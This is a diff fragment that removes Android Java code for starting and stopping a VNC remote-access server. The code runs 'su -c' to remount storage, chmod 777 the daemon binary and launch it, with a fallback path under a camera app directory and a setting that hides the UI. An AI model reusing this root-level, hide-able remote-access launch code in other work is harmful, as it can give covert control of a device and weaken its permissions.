-					droidvncserver_exec = "/system/lib/libandroidvncserver_pie.so";
-				}
-				else {
-					droidvncserver_exec = "/system/lib/libandroidvncserver.so";
-				}
-			}
-			
-			File f = new File(droidvncserver_exec);
-			if (!f.exists())
-			{
-				Log.d(TAG, "Warning! Could not find daemon file, " + droidvncserver_exec);
-				libpath_string = " -L " + "/system/app/MobileCamera/lib/arm/";
-				droidvncserver_exec   =   "/system/app/MobileCamera/lib/arm/libandroidvncserver_pie.so";
-				f = new File(droidvncserver_exec);
-				if (!f.exists())
-				{
-				Log.d(TAG, "Error! Could not find daemon file, " + droidvncserver_exec);
-				return;
-				}
-			}
-			
- 
- 			String remount_asec_string = "mount -o rw,dirsync,nosuid,nodev,noatime,remount /mnt/asec/" + getPackageName() + "-1";
-			String permission_string = "chmod 777 " + droidvncserver_exec;
-			String server_string = droidvncserver_exec  + " " + password_check + " " + other_string + " " + libpath_string + " ";
- 
-			boolean root = true;
-			root &= hasRootPermission();
- 
-			if (root)     
-			{ 
-				Log.d(TAG, "Running as root...");
-				//if (Build.VERSION.SDK_INT >= 23) {//Android-6.0
-				//	Runtime.getRuntime().exec("su 0 " + permission_string);
-				//	Runtime.getRuntime().exec("su 0 " + server_string,null,new File(files_dir));
-				//}
-				//else {
-				runNativeShellCmd("su -c \"" + remount_asec_string + "\"");
-				runNativeShellCmd("su -c \"" + permission_string + "\"");
-				runNativeShellCmdNoWait("su -c \"" + server_string + "\"");
-				//}
-			}
-			else
-			{
-				Log.d(TAG, "Not running as root...");
-				runNativeShellCmd(permission_string);
-				runNativeShellCmdNoWait(server_string);
-			}
-			// dont show password on logcat
-			Log.d(TAG, "Starting " + droidvncserver_exec  + " " + password_check+ " " + other_string + " " + libpath_string + " ");
-
-		} catch (Exception e) {
-			Log.d(TAG, "startVNCServer():" + e.getMessage());
-			final String fstr = "startVNCServer():" + e.getMessage();
-			if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
-	    	{
-	    		_instance.mMainHandler.post(new Runnable(){
-	    			@Override
-	    			public void run() {
-	    				SharedFuncLib.MyMessageTip(_instance, fstr);
-	    			}
-	    		});
-	    	}
-		}
-	}
-    
-	public void killVNCServer()
-	{
-		try {
-			LocalSocket clientSocket = new LocalSocket();
-			clientSocket.setSoTimeout(100);
-			
-			String toSend = "~KILL|";
-			byte[] buffer = toSend.getBytes();
-
-			LocalSocketAddress addr =  new LocalSocketAddress("unix_13132");
-			clientSocket.connect(addr);
-			
-			OutputStream os = clientSocket.getOutputStream();
-			os.write(buffer);
-			os.flush();
-			os.close();
-			clientSocket.close();
-		} catch (Exception e) {
-			Log.d(TAG, "killVNCServer():" + e.getMessage());
-			final String fstr = "killVNCServer():" + e.getMessage();
-			if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
-	    	{
-	    		_instance.mMainHandler.post(new Runnable(){
-	    			@Override
-	    			public void run() {
-	    				SharedFuncLib.MyMessageTip(_instance, fstr);
-	    			}
-	    		});
-	    	}
-		}
-	}
-	
-	private static void writeCommand(OutputStream os, String command) throws Exception {
-		os.write((command + "\n").getBytes("ASCII"));
-	}
 	
 	public static boolean j_should_do_upnp()
 	{
